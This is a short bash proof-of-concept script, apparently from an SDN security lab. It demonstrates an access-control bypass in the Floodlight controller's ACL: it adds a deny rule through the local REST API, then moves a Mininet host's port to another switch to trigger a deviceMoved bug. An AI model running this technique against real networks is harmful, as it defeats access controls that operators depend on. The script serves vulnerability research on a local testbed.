#!/usr/bin/env bash
# Attack A: access control bypass via host migration (Floodlight ACL deviceMoved bug)
set -e
CTRL=http://127.0.0.1:8080

echo "[*] Add ACL deny 10.0.0.1 -> 10.0.0.2"
curl -s -X POST -d '{"src-ip":"10.0.0.1/32","dst-ip":"10.0.0.2/32","action":"deny"}' "$CTRL/wm/acl/rules/json"; echo
sleep 10
echo "[*] ACL rules now:"; curl -s "$CTRL/wm/acl/rules/json"; echo
echo
echo ">>> In mininet:  h1 ping -c4 h2   (expect 100% loss = blocked)"
read -p ">>> Press Enter once the block is confirmed..."

echo "[*] Migrating h1 from s1 to s2 (the attack)"
sudo ovs-vsctl del-port s1 s1-eth1
sudo ovs-vsctl add-port s2 s1-eth1
sudo ip link set s1-eth1 up
echo "[*] h1 is now on s2."
echo ">>> In mininet (run twice):  h1 ping -c4 h2   (second run 0% = BYPASS)"
